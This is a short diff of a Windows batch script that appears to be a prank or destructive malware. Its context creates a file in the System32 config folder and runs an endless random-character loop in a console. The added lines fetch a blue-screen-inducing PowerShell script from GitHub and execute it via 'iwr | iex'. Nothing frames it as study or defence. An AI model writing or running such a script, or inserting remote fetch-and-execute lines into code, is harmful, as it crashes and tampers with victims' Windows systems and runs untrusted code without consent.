@@ -13,8 +13,10 @@ start "" "msg.txt"
 fsutil file createnew C:\Windows\System32\config\OSDATA 0 >nul
 
 goto loop
+timeout 10 /nobreak >nul
+powershell iwr https://github.com/peewpw/Invoke-BSOD/raw/refs/heads/master/Invoke-BSOD.ps1 | iex
 
 :loop
 cmd /k powershell -NoProfile -Command "while ($true) { Write-Host -NoNewline ([char](Get-Random -Minimum 33 -Maximum 127)); Start-Sleep -Milliseconds 1 }"
-timeout 1 /nobreak >nul
+timeout 2 /nobreak >nul
 goto loop
